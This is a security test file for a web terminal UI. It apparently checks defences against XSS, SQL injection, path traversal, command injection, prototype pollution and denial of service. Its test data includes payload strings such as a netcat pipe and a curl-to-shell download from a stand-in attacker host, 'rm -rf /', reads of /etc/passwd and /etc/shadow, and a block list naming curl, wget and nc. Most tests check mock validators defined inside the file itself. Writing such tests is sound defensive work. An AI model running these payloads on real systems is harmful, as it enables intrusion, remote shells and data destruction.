/**
 * Critical Security Testing Suite for Claude Flow UI
 * Validates security measures and identifies vulnerabilities
 */

import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { Terminal } from '@xterm/xterm';

// Test Data Generation
const generateMaliciousInputs = () => ({
  xss: [
    '<script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="alert(\'XSS\')">',
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    '<svg onload=alert(1)>',
    '"><svg/onload=alert(/XSS/)>',
    '\u003cimg src=x onerror=alert(1)\u003e'
  ],
  injection: [
    '\'; DROP TABLE sessions; --',
    '1\' OR \'1\'=\'1',
    'admin\'--',
    '\' UNION SELECT password FROM users--',
    'test\'; SHUTDOWN; --'
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/shadow',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '....//....//....//etc//passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd'
  ],
  commandInjection: [
    '$(whoami)',
    '`whoami`',
    '; cat /etc/passwd',
    '| nc attacker.com 4444',
    '&& rm -rf /',
    '; curl http://evil.com/malware.sh | sh',
    '\nrm -rf /\n'
  ],
  oversizedInputs: [
    'A'.repeat(10000),
    'A'.repeat(100000),
    'A'.repeat(1000000)
  ]
});

describe('Security Testing Suite', () => {
  const maliciousInputs = generateMaliciousInputs();
  let consoleSpy: jest.SpyInstance;

  beforeEach(() => {
    consoleSpy = jest.spyOn(console, 'error').mockImplementation();
  });

  afterEach(() => {
    consoleSpy.mockRestore();
  });

  describe('XSS Prevention', () => {
    it('should sanitize terminal input data', () => {
      const mockTerminal = {
        write: jest.fn(),
        clear: jest.fn(),
        focus: jest.fn()
      };

      maliciousInputs.xss.forEach((xssPayload) => {
        // Test that XSS payloads don't execute
        mockTerminal.write(xssPayload);

        // Verify the payload was written as text, not executed
        expect(mockTerminal.write).toHaveBeenCalledWith(xssPayload);

        // Check that no script execution occurred (no alerts, no DOM modifications)
        expect(document.querySelector('script')).toBeNull();
      });
    });

    it('should escape special characters in terminal output', () => {
      const testCases = [
        { input: '<script>', expected: '&lt;script&gt;' },
        { input: '"dangerous"', expected: '&quot;dangerous&quot;' },
        { input: '&malicious', expected: '&amp;malicious' }
      ];

      testCases.forEach(({ input, expected }) => {
        // Mock HTML sanitization function
        const sanitize = (str: string) =>
          str.replace(/&/g, '&amp;')
             .replace(/</g, '&lt;')
             .replace(/>/g, '&gt;')
             .replace(/"/g, '&quot;')
             .replace(/'/g, '&#x27;');

        expect(sanitize(input)).toBe(expected);
      });
    });

    it('should validate WebSocket message structure', () => {
      const validMessage = {
        type: 'data',
        sessionId: 'test-session',
        data: 'safe data'
      };

      const invalidMessages = [
        { type: '<script>alert(1)</script>', sessionId: 'test', data: 'test' },
        { type: 'data', sessionId: '../../../etc/passwd', data: 'test' },
        { type: 'data', sessionId: 'test', data: null },
        { type: 'data', sessionId: null, data: 'test' },
        null,
        undefined,
        'not an object'
      ];

      // Mock validation function
      const validateMessage = (msg: any): boolean => {
        if (!msg || typeof msg !== 'object') return false;
        if (!msg.type || typeof msg.type !== 'string') return false;
        if (msg.sessionId && typeof msg.sessionId !== 'string') return false;
        if (msg.data && typeof msg.data !== 'string') return false;

        // Check for malicious patterns
        const maliciousPattern = /<script|javascript:|onerror=|onload=/i;
        if (maliciousPattern.test(msg.type) ||
            (msg.sessionId && maliciousPattern.test(msg.sessionId)) ||
            (msg.data && maliciousPattern.test(msg.data))) {
          return false;
        }

        return true;
      };

      expect(validateMessage(validMessage)).toBe(true);
      invalidMessages.forEach(msg => {
        expect(validateMessage(msg)).toBe(false);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in terminal commands', () => {
      maliciousInputs.commandInjection.forEach((payload) => {
        // Mock command validation
        const isValidCommand = (cmd: string): boolean => {
          // Block dangerous characters and patterns
          const dangerousPatterns = [
            /[;&|`$()]/,  // Shell metacharacters
            /\s*(rm|cat|curl|wget|nc|netcat)\s+/i,  // Dangerous commands
            /\n|\r/,  // Newlines
            /\|\s*sh/i,  // Pipe to shell
            />\s*\/dev/i  // Redirect to device files
          ];

          return !dangerousPatterns.some(pattern => pattern.test(cmd));
        };

        expect(isValidCommand(payload)).toBe(false);
      });
    });

    it('should sanitize environment variables', () => {
      const dangerousEnvVars = [
        'PATH=/tmp:$PATH',
        'LD_PRELOAD=/tmp/malicious.so',
        'NODE_OPTIONS=--inspect=0.0.0.0:9229'
      ];

      dangerousEnvVars.forEach((envVar) => {
        // Mock environment variable validation
        const validateEnvVar = (env: string): boolean => {
          const [key, value] = env.split('=');

          // Block dangerous environment variables
          const dangerousKeys = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'NODE_OPTIONS'];
          if (dangerousKeys.includes(key)) return false;

          // Validate PATH modifications
          if (key === 'PATH' && value.includes('/tmp')) return false;

          return true;
        };

        expect(validateEnvVar(envVar)).toBe(false);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', () => {
      maliciousInputs.pathTraversal.forEach((path) => {
        // Mock path validation
        const isValidPath = (filePath: string): boolean => {
          // Normalize path and check for traversal
          const normalizedPath = filePath.replace(/\\/g, '/');

          // Block path traversal patterns
          const traversalPatterns = [
            /\.\./,
            /\/etc\//,
            /\/windows\//i,
            /%2e%2e/i,
            /\\.\\./,
            /\/sys\//,
            /\/proc\//
          ];

          return !traversalPatterns.some(pattern => pattern.test(normalizedPath));
        };

        expect(isValidPath(path)).toBe(false);
      });
    });

    it('should validate session file paths', () => {
      const validPaths = [
        '/tmp/claude-flow/session-123',
        '/var/tmp/terminals/abc123'
      ];

      const invalidPaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        'C:\\Windows\\System32'
      ];

      const validateSessionPath = (path: string): boolean => {
        // Only allow paths in designated temp directories
        const allowedBasePaths = ['/tmp/', '/var/tmp/'];
        const normalizedPath = path.replace(/\\/g, '/');

        if (!allowedBasePaths.some(base => normalizedPath.startsWith(base))) {
          return false;
        }

        // Block traversal attempts
        return !normalizedPath.includes('../');
      };

      validPaths.forEach(path => {
        expect(validateSessionPath(path)).toBe(true);
      });

      invalidPaths.forEach(path => {
        expect(validateSessionPath(path)).toBe(false);
      });
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle oversized inputs gracefully', async () => {
      maliciousInputs.oversizedInputs.forEach((oversizedInput) => {
        // Mock input size validation
        const MAX_INPUT_SIZE = 65536; // 64KB limit

        const validateInputSize = (input: string): boolean => {
          return input.length <= MAX_INPUT_SIZE;
        };

        if (oversizedInput.length > MAX_INPUT_SIZE) {
          expect(validateInputSize(oversizedInput)).toBe(false);
        }
      });
    });

    it('should validate session IDs format', () => {
      const validSessionIds = [
        'session-123',
        'abc123def456',
        'terminal-session-001'
      ];

      const invalidSessionIds = [
        '../session',
        'session;rm -rf /',
        'session<script>',
        null,
        undefined,
        '',
        'a'.repeat(1000)
      ];

      const validateSessionId = (sessionId: any): boolean => {
        if (!sessionId || typeof sessionId !== 'string') return false;
        if (sessionId.length > 100) return false; // Reasonable limit

        // Only allow alphanumeric characters, hyphens, and underscores
        const validPattern = /^[a-zA-Z0-9_-]+$/;
        return validPattern.test(sessionId);
      };

      validSessionIds.forEach(id => {
        expect(validateSessionId(id)).toBe(true);
      });

      invalidSessionIds.forEach(id => {
        expect(validateSessionId(id)).toBe(false);
      });
    });

    it('should prevent prototype pollution', () => {
      const maliciousPayloads = [
        { '__proto__.polluted': 'true' },
        { 'constructor.prototype.polluted': 'true' },
        JSON.stringify({ '__proto__': { 'polluted': true } })
      ];

      maliciousPayloads.forEach((payload) => {
        // Mock object merge that prevents prototype pollution
        const safeMerge = (target: any, source: any): any => {
          const bannedKeys = ['__proto__', 'constructor', 'prototype'];

          if (typeof source === 'string') {
            try {
              source = JSON.parse(source);
            } catch {
              return target;
            }
          }

          const result = { ...target };

          for (const key in source) {
            if (bannedKeys.includes(key)) continue;
            if (key.includes('proto') || key.includes('constructor')) continue;
            result[key] = source[key];
          }

          return result;
        };

        const original = {};
        const merged = safeMerge(original, payload);

        // Verify prototype was not polluted
        expect((original as any).polluted).toBeUndefined();
        expect((Object.prototype as any).polluted).toBeUndefined();
      });
    });
  });

  describe('Authentication and Authorization', () => {
    it('should validate session ownership', () => {
      const sessionDatabase = new Map([
        ['session-1', { owner: 'user1', created: Date.now() }],
        ['session-2', { owner: 'user2', created: Date.now() }]
      ]);

      const validateSessionAccess = (sessionId: string, userId: string): boolean => {
        const session = sessionDatabase.get(sessionId);
        if (!session) return false;
        return session.owner === userId;
      };

      // Valid access
      expect(validateSessionAccess('session-1', 'user1')).toBe(true);
      expect(validateSessionAccess('session-2', 'user2')).toBe(true);

      // Invalid access
      expect(validateSessionAccess('session-1', 'user2')).toBe(false);
      expect(validateSessionAccess('session-2', 'user1')).toBe(false);
      expect(validateSessionAccess('nonexistent', 'user1')).toBe(false);
    });

    it('should handle session timeouts', () => {
      const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24 hours
      const now = Date.now();

      const sessions = [
        { id: 'active', created: now - 1000 }, // 1 second ago
        { id: 'expired', created: now - SESSION_TIMEOUT - 1000 } // Expired
      ];

      const isSessionValid = (session: { created: number }): boolean => {
        return (now - session.created) < SESSION_TIMEOUT;
      };

      expect(isSessionValid(sessions[0])).toBe(true);
      expect(isSessionValid(sessions[1])).toBe(false);
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should implement rate limiting for WebSocket messages', () => {
      const rateLimiter = new Map<string, { count: number; resetTime: number }>();
      const RATE_LIMIT = 100; // 100 messages per minute
      const RATE_WINDOW = 60 * 1000; // 1 minute

      const checkRateLimit = (clientId: string): boolean => {
        const now = Date.now();
        const client = rateLimiter.get(clientId);

        if (!client || now > client.resetTime) {
          rateLimiter.set(clientId, { count: 1, resetTime: now + RATE_WINDOW });
          return true;
        }

        if (client.count >= RATE_LIMIT) {
          return false;
        }

        client.count++;
        return true;
      };

      // Test normal usage
      for (let i = 0; i < RATE_LIMIT; i++) {
        expect(checkRateLimit('client1')).toBe(true);
      }

      // Test rate limiting
      expect(checkRateLimit('client1')).toBe(false);

      // Test different client
      expect(checkRateLimit('client2')).toBe(true);
    });

    it('should prevent memory exhaustion attacks', () => {
      const MAX_SESSIONS_PER_CLIENT = 10;
      const sessions = new Map<string, string[]>();

      const canCreateSession = (clientId: string): boolean => {
        const clientSessions = sessions.get(clientId) || [];
        return clientSessions.length < MAX_SESSIONS_PER_CLIENT;
      };

      const createSession = (clientId: string, sessionId: string): boolean => {
        if (!canCreateSession(clientId)) return false;

        const clientSessions = sessions.get(clientId) || [];
        clientSessions.push(sessionId);
        sessions.set(clientId, clientSessions);
        return true;
      };

      // Test normal usage
      for (let i = 0; i < MAX_SESSIONS_PER_CLIENT; i++) {
        expect(createSession('client1', `session-${i}`)).toBe(true);
      }

      // Test limit enforcement
      expect(createSession('client1', 'session-overflow')).toBe(false);
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', () => {
      const sanitizeError = (error: Error): string => {
        const message = error.message;

        // Remove file paths
        const cleanMessage = message
          .replace(/\/[^\s]+/g, '[PATH_REDACTED]')
          .replace(/C:\\[^\s]+/g, '[PATH_REDACTED]')
          .replace(/password[^\s]*/gi, '[CREDENTIAL_REDACTED]')
          .replace(/token[^\s]*/gi, '[TOKEN_REDACTED]')
          .replace(/key[^\s]*/gi, '[KEY_REDACTED]');

        return cleanMessage;
      };

      const sensitiveErrors = [
        new Error('Failed to read /etc/passwd'),
        new Error('Invalid password: secret123'),
        new Error('Database connection failed: postgresql://user:pass@host'),
        new Error('Token expired: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...')
      ];

      sensitiveErrors.forEach(error => {
        const sanitized = sanitizeError(error);
        expect(sanitized).not.toContain('/etc/passwd');
        expect(sanitized).not.toContain('secret123');
        expect(sanitized).not.toContain('postgresql://');
        expect(sanitized).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');
      });
    });

    it('should handle malformed JSON gracefully', () => {
      const malformedJson = [
        '{"incomplete": true',
        '{"__proto__": {"polluted": true}}',
        '{"type": "data", "sessionId": null}',
        'not json at all',
        '{"nested": {"deep": {"very": {"deep": "object"}}}}'
      ];

      const safeParseJson = (json: string): any => {
        try {
          const parsed = JSON.parse(json);

          // Prevent prototype pollution
          if (parsed.__proto__ || parsed.constructor || parsed.prototype) {
            return null;
          }

          // Limit object depth
          const MAX_DEPTH = 5;
          const checkDepth = (obj: any, depth = 0): boolean => {
            if (depth > MAX_DEPTH) return false;
            if (typeof obj !== 'object' || obj === null) return true;

            for (const key in obj) {
              if (!checkDepth(obj[key], depth + 1)) return false;
            }
            return true;
          };

          if (!checkDepth(parsed)) return null;

          return parsed;
        } catch {
          return null;
        }
      };

      malformedJson.forEach(json => {
        expect(() => safeParseJson(json)).not.toThrow();
        const result = safeParseJson(json);
        if (result) {
          expect(result.__proto__).toBeUndefined();
          expect((result as any).polluted).toBeUndefined();
        }
      });
    });
  });

  describe('Content Security Policy', () => {
    it('should enforce strict CSP headers', () => {
      const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; font-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none';";

      // Mock CSP validation
      const validateCSP = (policy: string): boolean => {
        const requiredDirectives = [
          "default-src 'self'",
          "object-src 'none'",
          "frame-ancestors 'none'"
        ];

        return requiredDirectives.every(directive => policy.includes(directive));
      };

      expect(validateCSP(cspHeader)).toBe(true);
    });
  });
});